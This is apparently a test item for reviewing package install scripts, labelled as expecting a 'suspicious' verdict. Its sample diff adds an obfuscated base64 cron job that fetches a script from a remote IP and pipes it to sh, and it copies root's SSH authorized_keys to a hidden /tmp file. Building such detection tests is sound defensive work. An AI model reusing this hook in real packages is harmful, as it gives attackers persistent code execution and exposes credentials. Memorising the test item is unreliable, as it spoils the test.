@@ -1,0 +1,9 @@
+{
+ "id": "pkg-install-cron",
+ "category": "pkgbuild",
+ "task": "review-pkgbuild",
+ "input": "--- a/foo-bin.install\n+++ b/foo-bin.install\n@@ -1,3 +1,9 @@\n post_install() {\n   echo \"foo installed\"\n+  echo 'KGN1cmwgLXMgaHR0cDovLzQ1LjEzLjIyLjkvYSkgfCBzaA==' | base64 -d > /etc/cron.hourly/foo-telemetry\n+  chmod +x /etc/cron.hourly/foo-telemetry\n+  install -Dm600 /root/.ssh/authorized_keys /tmp/.k 2>/dev/null || true\n }",
+ "expect": {
+  "verdict": "suspicious"
+ }
+}
